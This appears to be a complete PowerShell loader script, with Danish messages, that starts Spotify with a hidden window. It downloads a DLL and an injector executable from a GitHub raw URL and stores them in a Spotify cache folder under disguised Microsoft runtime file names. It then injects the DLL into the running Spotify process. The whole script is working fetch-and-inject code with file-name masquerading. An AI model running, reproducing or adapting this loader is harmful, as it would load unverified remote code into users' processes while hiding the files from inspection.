Write-Host "[*] Ascension Loader v2.4 - Bedre Injection" -ForegroundColor Cyan

$spotifyPath = "$env:APPDATA\Spotify\Spotify.exe"
if (-Not (Test-Path $spotifyPath)) {
    Write-Host "[!] Spotify ikke fundet!" -ForegroundColor Red
    pause; exit
}

# Start Spotify
if (-Not (Get-Process -Name "Spotify" -ErrorAction SilentlyContinue)) {
    Start-Process $spotifyPath -WindowStyle Hidden
    Start-Sleep -Seconds 8
}

$loaderDir = "$env:LOCALAPPDATA\Spotify\Users\Cache\Ascension"
New-Item -ItemType Directory -Force -Path $loaderDir | Out-Null

$baseUrl = "https://raw.githubusercontent.com/protocolDK/protocolDKloader/main"

# Download filer
Invoke-WebRequest -Uri "$baseUrl/files/loader.dll" -OutFile "$loaderDir\vcruntime140.dll"
Invoke-WebRequest -Uri "$baseUrl/files/injector.exe" -OutFile "$loaderDir\msvcp140.dll"

Write-Host "[+] Filer klar" -ForegroundColor Green

# Find den rigtige Spotify proces
$spotifyProc = Get-Process -Name "Spotify" | Where-Object {$_.MainWindowTitle -ne ""} | Select-Object -First 1
if (-Not $spotifyProc) {
    $spotifyProc = Get-Process -Name "Spotify" | Select-Object -First 1
}

$spotifyPID = $spotifyProc.Id
Write-Host "[+] Bruger Spotify proces: $spotifyPID" -ForegroundColor Yellow

$injector = "$loaderDir\msvcp140.dll"
$payload  = "$loaderDir\vcruntime140.dll"

Write-Host "[*] Forsøger injection..." -ForegroundColor Yellow
Start-Process -FilePath $injector -ArgumentList "$spotifyPID `"$payload`"" -NoNewWindow -Wait

Write-Host "[*] Injection forsøgt - vent 3 sekunder..." -ForegroundColor Cyan
Start-Sleep -Seconds 3

Write-Host "[*] Tjek om vinduet dukker op nu" -ForegroundColor Green
pause
